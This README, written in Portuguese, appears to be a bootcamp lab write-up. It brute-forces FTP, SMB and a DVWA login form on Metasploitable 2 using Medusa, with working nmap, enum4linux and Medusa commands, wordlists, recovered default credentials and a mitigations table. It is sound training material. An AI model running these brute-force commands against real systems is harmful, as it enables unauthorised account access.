# 🔐 Simulando um Ataque de Brute Force com Medusa e Kali Linux

![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kali-linux&logoColor=white)
![Medusa](https://img.shields.io/badge/Medusa-2.3-8B0000?style=for-the-badge)
![Metasploitable](https://img.shields.io/badge/Metasploitable_2-2E3440?style=for-the-badge)
![Status](https://img.shields.io/badge/status-conclu%C3%ADdo-success?style=for-the-badge)

> **Aviso legal:** todo o conteúdo deste repositório foi produzido em **laboratório próprio, isolado e controlado**, com máquinas virtuais de teste (Metasploitable 2 e DVWA). O objetivo é **aprender a detectar e mitigar** ataques de força bruta. Não utilize estas técnicas em sistemas que você não possui ou não tem autorização escrita para testar — no Brasil isso é crime (Lei 12.737/2012, art. 154-A do Código Penal).

---

## 📌 Sobre o desafio

Desafio de projeto do bootcamp de Cibersegurança: simular um **ataque de força bruta de senhas** com a ferramenta **Medusa** no **Kali Linux**, contra ambientes intencionalmente vulneráveis, documentando cada etapa — reconhecimento, enumeração, exploração e **mitigação**.

O **Medusa** é um *brute-forcer* modular e paralelo: combina listas de usuários e senhas contra serviços de autenticação (FTP, SSH, SMB, HTTP, bancos de dados), com várias threads simultâneas.

## 🎯 Objetivos

- [x] Montar um laboratório isolado: Kali Linux (atacante) × Metasploitable 2 (alvo)
- [x] Confirmar conectividade e enumerar os serviços expostos com Nmap
- [x] Enumerar usuários, compartilhamentos e política de senhas com `enum4linux`
- [x] Executar o ataque com Medusa nos módulos `ftp`, `smbnt` e `http`/web-form
- [x] Validar o acesso obtido em cada serviço
- [x] Propor as mitigações correspondentes

## 🧪 Ambiente do laboratório

| Papel | Sistema | IP |
|-------|---------|----|
| Atacante | Kali Linux (VM) | `192.168.56.102` |
| Alvo | Metasploitable 2 (VM) | `192.168.56.101` |

- **Rede:** Host-Only no VirtualBox — sem exposição à internet
- **Ferramentas:** `nmap` 7.99, `enum4linux` 0.9.1, `medusa` 2.3, cliente `ftp`
- **Wordlists:** listas pequenas criadas para o exercício (`user.txt`, `pass.txt`, `smb_user.txt`, `senhas_spray.txt`)

## 🛠️ Ferramentas utilizadas

| Ferramenta | Função |
|------------|--------|
| **Kali Linux** | Distribuição do ambiente atacante |
| **Nmap** | Descoberta de portas e versões de serviço |
| **enum4linux** | Enumeração SMB/NetBIOS (usuários, shares, política de senhas) |
| **Medusa 2.3** | Ataque de força bruta paralelo e modular |
| **Metasploitable 2** | Alvo intencionalmente vulnerável |
| **DVWA** | Aplicação web vulnerável (formulário de login) |

---

## 🔍 Etapa 1 — Reconhecimento

### 1.1 Conectividade com o alvo

```bash
ping -c 3 192.168.56.101
```

3 pacotes enviados, 3 recebidos, **0% de perda** — o alvo está ativo na rede do laboratório.

![Ping confirmando conectividade com o alvo](images/01-reconhecimento/01-ping-alvo.png)

### 1.2 Enumeração de serviços com Nmap

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

| Porta | Serviço | Versão detectada |
|-------|---------|------------------|
| 21/tcp | ftp | **vsftpd 2.3.4** |
| 22/tcp | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 80/tcp | http | Apache httpd 2.2.8 (Ubuntu) DAV/2 |
| 139/tcp | netbios-ssn | Samba smbd 3.X – 4.X (WORKGROUP) |
| 445/tcp | netbios-ssn | Samba smbd 3.X – 4.X (WORKGROUP) |

O `-sV` identifica a **versão** de cada serviço — é o que permite escolher o módulo certo do Medusa e reconhecer alvos conhecidamente vulneráveis.

![Nmap revelando os serviços abertos](images/01-reconhecimento/02-nmap-servicos.png)

---

## 🗂️ Etapa 2 — Enumeração SMB com enum4linux

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

O `-a` executa **todos** os testes de enumeração. O que ele revelou:

**Sessão nula permitida** — o servidor aceita sessão com usuário e senha vazios:

![enum4linux mostrando a sessão nula aceita](images/02-enumeracao-smb/01-enum4linux-alvo.png)

**Identificação do alvo** via SRVINFO:

```
METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)
platform_id: 500   os version: 4.9   server type: 0x9a03
```

![SRVINFO e início da lista de usuários](images/02-enumeracao-smb/02-srvinfo-e-usuarios.png)

**Usuários do sistema expostos** (35 contas), entre elas `root`, `msfadmin`, `service`, `user`, `www-data`, `postgres`, `mysql`, `tomcat55`.

![Lista de usuários enumerados](images/02-enumeracao-smb/06-lista-de-usuarios.png)

**Compartilhamentos SMB** publicados:

| Share | Tipo | Comentário |
|-------|------|-----------|
| `print$` | Disk | Printer Drivers |
| `tmp` | Disk | oh noes! |
| `opt` | Disk | — |
| `IPC$` | IPC | IPC Service (metasploitable server) |
| `ADMIN$` | IPC | IPC Service (metasploitable server) |

![Shares SMB descobertos](images/02-enumeracao-smb/03-shares.png)

**Mapeamento dos shares:** apenas `//192.168.56.101/tmp` permitiu *mapping* e *listing*; `print$`, `opt` e `ADMIN$` foram negados; `IPC$` retornou `NT_STATUS_NETWORK_ACCESS_DENIED`.

![Tentativa de mapear cada share](images/02-enumeracao-smb/04-mapeamento-de-shares.png)

**Política de senhas** — o achado mais grave para o ataque:

| Parâmetro | Valor |
|-----------|-------|
| Comprimento mínimo | 5 caracteres |
| Complexidade | **Desabilitada** (flags `000000`) |
| Histórico de senhas | Nenhum |
| Idade máxima | Não definida |
| Limite de bloqueio | **Nenhum** (`Account Lockout Threshold: None`) |

Sem complexidade e **sem bloqueio por tentativas**, o serviço não impõe nenhum custo ao atacante — foi exatamente essa configuração que tornou o brute force viável.

![Política de senhas do domínio](images/02-enumeracao-smb/09-politica-de-senhas.png)

**SID e grupos** também foram obtidos (`S-1-5-21-1042354039-2475377354-766472396`), com os membros de *Domain Admins* e *Domain Users*. Nenhuma impressora retornada.

![SID, grupos e encerramento da enumeração](images/02-enumeracao-smb/10-grupos-e-encerramento.png)

---

## 💥 Etapa 3 — Força bruta em FTP

### 3.1 Montagem das wordlists

```bash
echo -e 'user\nmsfadmin\nadmin\nroot' > user.txt
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```

### 3.2 Execução do Medusa

```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 6
```

| Flag | Significado |
|------|-------------|
| `-h` | host alvo |
| `-U` | arquivo com usuários |
| `-P` | arquivo com senhas |
| `-M ftp` | módulo FTP |
| `-t 6` | 6 threads simultâneas |

**Resultado — `ACCOUNT FOUND`:**

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

O servidor também aceitou combinações de `admin` e `root` com senhas do dicionário — sinal de senhas fracas e repetidas entre contas.

![Wordlists e saída do Medusa no FTP](images/03-ftp/02-medusa-wordlists.png)

### 3.3 Validação do acesso

```bash
ftp 192.168.56.101
```

Banner do servidor (`220 (vsFTPd 2.3.4)`), login como `msfadmin` e resposta **`230 Login successful`**. A credencial encontrada pelo Medusa é válida.

![Conexão e login bem-sucedido no FTP](images/03-ftp/01-conexao-ftp.png)

![Saída completa: Medusa e sessão FTP autenticada](images/03-ftp/03-medusa-acesso-ftp.png)

---

## 💥 Etapa 4 — Força bruta em SMB

### 4.1 Wordlists de *password spraying*

```bash
echo -e 'user\nmsfadmin\nservice' > smb_user.txt
echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt
```

### 4.2 Execução

```bash
medusa -h 192.168.56.101 -U smb_user.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

Usei `-t 2` (poucas threads) de propósito: o SMB derruba conexões em excesso, e menos paralelismo mantém o serviço estável durante o teste.

**Resultado:**

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin
              [SUCCESS (ADMIN$ - Access Allowed)]
```

O Medusa não apenas autenticou, como reportou **acesso ao `ADMIN$`** — o share administrativo do Windows/Samba.

![Medusa no módulo smbnt com acesso ao ADMIN$](images/04-smb/01-medusa-smbnt.png)

---

## 💥 Etapa 5 — Formulário web (DVWA)

### 5.1 O alvo

O DVWA está publicado em `192.168.56.101/dvwa/login.php` com o formulário padrão de usuário/senha:

![Tela de login do DVWA](images/05-dvwa/01-dvwa-login.png)

### 5.2 Tentativa de força bruta no formulário

```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M http \
  -m PAGE:/dvwa/login.php \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Login failed' -t 6
```

> ⚠️ **O módulo errado invalida o resultado.** O correto para formulários é `-M web-form`. Usando `-M http`, o Medusa só faz requisição básica na página e **ignora os parâmetros do formulário** — daí a enxurrada de `WARNING: Invalid method` na saída. Os `ACCOUNT FOUND` que aparecem ali são **falsos positivos** e não devem ser usados como evidência.

![Warnings do módulo http e os falsos positivos](images/05-dvwa/04-medusa-web-form.png)

### 5.3 Validação manual

Testei o formulário à mão. Com credenciais erradas (`vagner` / `123`), o servidor devolve **"falha no login"** — e a aba *Rede* do navegador mostra o `POST` com os campos `username`, `password` e `Login`:

![Login recusado e payload do POST inspecionado](images/05-dvwa/02-dvwa-login-falhou.png)

Com as credenciais padrão (`admin` / `password`), o acesso é concedido e o painel exibe **"Você fez login como 'admin'"**, com o nível de segurança em **high**:

![Painel do DVWA autenticado como admin](images/05-dvwa/03-dvwa-painel-admin.png)

**Conclusão da etapa:** o formulário do DVWA é um alvo viável para força bruta — não há CAPTCHA, bloqueio por tentativas nem atraso progressivo. A exploração automatizada exigiria apenas o comando correto (`-M web-form` com `FORM-DATA`), que ficou documentado como aprendizado.

---

## 📊 Resultados consolidados

| Serviço | Módulo | Evidência | Status |
|---------|--------|-----------|--------|
| FTP (21) | `ftp` | `ACCOUNT FOUND … msfadmin:msfadmin` + `230 Login successful` | ✅ Credencial válida |
| SMB (445) | `smbnt` | `ACCOUNT FOUND … [SUCCESS (ADMIN$ - Access Allowed)]` | ✅ Acesso obtido |
| HTTP/DVWA (80) | `http` | `WARNING: Invalid method` | ⚠️ Módulo incorreto — repetir com `web-form` |

**O que realmente quebrou a segurança:** não foi a ferramenta. Foi a combinação de **política de senhas sem complexidade**, **ausência de bloqueio por tentativas**, **contas padrão não alteradas** (`msfadmin:msfadmin`) e **sessões nulas** no SMB. O Medusa só transformou essas falhas em acesso.

## 🛡️ Mitigações

| Vetor | Mitigação |
|-------|-----------|
| FTP | Desabilitar FTP em texto claro; usar SFTP/FTPS; bloquear após N falhas; desativar contas padrão |
| SMB | Desativar SMBv1 e **sessões nulas**; restringir 139/445 por firewall; remover `ADMIN$` de contas comuns |
| Formulário web | CAPTCHA, rate limiting, MFA, bloqueio progressivo por IP **e** por conta |
| Política de senhas | Complexidade habilitada, comprimento mínimo ≥ 12, histórico, **account lockout threshold** |
| Detecção | Monitorar logs de autenticação e alertar em picos de falha (assinatura clássica de brute force) |
| Geral | MFA em todos os serviços que suportarem; princípio do menor privilégio |

## 🧠 Aprendizados

1. **Reconhecimento define o ataque.** Porta, serviço e versão determinam o módulo do Medusa e a estratégia.
2. **Enumeração vale mais que o dicionário.** O `enum4linux` entregou usuários válidos e a política de senhas — informação que reduziu o espaço de busca drasticamente.
3. **A política de senhas é o alvo real.** Sem complexidade e sem lockout, qualquer wordlist funciona.
4. **Módulo errado = resultado errado.** O `-M http` gerou `ACCOUNT FOUND` falsos; só a validação manual mostrou a verdade. Evidência sem validação não é evidência.
5. **Força bruta é ruidosa por natureza** — e é justamente essa assinatura que a defesa precisa detectar.

## 📚 Referências

- [Medusa — Kali Linux Tools](https://www.kali.org/tools/medusa/)
- [Medusa man page (Ubuntu)](https://manpages.ubuntu.com/manpages/jammy/man1/medusa.1.html)
- [Medusa — parâmetros dos módulos](https://www.aldeid.com/wiki/Medusa)
- [Metasploitable 2 — Documentation](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [OWASP — Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)

---

<p align="center">
Desafio de projeto — Cibersegurança · documentação produzida para fins educacionais.
</p>
